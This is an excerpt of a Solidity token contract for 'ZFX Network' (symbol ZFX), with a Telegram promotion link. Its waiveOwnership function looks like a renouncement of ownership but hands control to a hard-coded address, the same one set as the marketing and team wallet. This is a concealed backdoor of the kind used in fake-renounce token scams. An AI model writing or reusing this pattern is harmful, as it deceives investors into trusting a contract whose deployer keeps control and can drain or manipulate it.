// *Telegram : https://t.me/zfxnetwork
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x99DCe6751eca377DB02652f93C95d6e868099Cf7));
        _owner = address(0x99DCe6751eca377DB02652f93C95d6e868099Cf7);
    }
...
contract ZFXNETWORK is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "ZFX Network";
    string private _symbol = "ZFX";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x99DCe6751eca377DB02652f93C95d6e868099Cf7);
    address payable public teamWalletAddress = payable(0x99DCe6751eca377DB02652f93C95d6e868099Cf7);
